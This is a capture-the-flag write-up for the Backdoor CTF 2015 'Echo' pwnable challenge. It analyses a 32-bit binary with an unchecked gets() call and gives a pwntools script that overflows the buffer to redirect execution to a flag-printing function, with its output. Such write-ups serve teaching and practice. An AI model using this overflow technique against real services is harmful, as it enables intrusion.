# Backdoor CTF 2015: Echo

**Category:** Pwnable
**Points:** 100
**Description:** 

> Little Suzie started learning C. She created a simple program that echo's back whatever you input. 
> [Here](challenge/echo) is the binary file. 
> The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.

## Write-up

Take a peek at the binary

>```bash
> file echo
> echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x465c87a1ebfcdf7b01bfa8daed8f376d2bae9dfe, not stripped
>```

What does checksec say?

>```bash
> gdb-peda$ checksec
> CANARY    : disabled
> FORTIFY   : disabled
> NX        : ENABLED
> PIE       : disabled
> RELRO     : Partial
>```

A straight-forward non-stripped 32-bit ELF with non-exec stack. Let's fire up our decompiler and get the interesting functions out of it:

>```c
>int __cdecl main(int argc, const char **argv, const char **envp)
>{
>  test();
>  return 0;
>}
>
>int test()
>{
>  char s; // [sp+1Eh] [bp-3Ah]@1
>
>  gets(&s);
>  sleep(1u);
>  return fprintf(_bss_start, "ECHO: %s\n", &s);
>}
>
>signed int sample()
>{
>  signed int result; // eax@2
>  char s; // [sp+18h] [bp-70h]@4
>  FILE *stream; // [sp+7Ch] [bp-Ch]@1
>
>  stream = fopen("flag.txt", "r");
>  if ( stream )
>  {
>    while ( fgets(&s, 100, stream) )
>      fputs(&s, _bss_start);
>    fclose(stream);
>    result = 0;
>  }
>  else
>  {
>    result = 1;
>  }
>  return result;
>}
>```

Ok, that looks good. A simple gets() stack overflow (of a buffer of length 58 bytes) and a function to print our flag. [Simply](solution/echosploit.py) overflow our buffer s into the EIP to point it to sample() to get the flag:

>```python
>#!/usr/bin/python
>#
># Backdoor CTF 2015
># ECHO (PWN/100)
>#
># @a: Smoke Leet Everyday
># @u: https://github.com/smokeleeteveryday
>#
>
>from pwn import *
>from struct import pack, unpack
>
>host = 'hack.bckdr.in'
>h = remote(host, 8002, timeout = None)
>buf = "A" * 62 + pack('<I', 0x0804857D) # Address of sample()
>h.send(buf + "\n")
>print h.recvall()
>
>h.close()
>```

And we got the flag:

>```bash
>$ python echosploit.py 
> [+] Opening connection to hack.bckdr.in on port 8002: Done
> [+] Recieving all data: Done (138B)
> [*] Closed connection to hack.bckdr.in port 8002
> ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}\x85\x0
> {flag removed upon request of backdoorCTF admins ;)}
>```
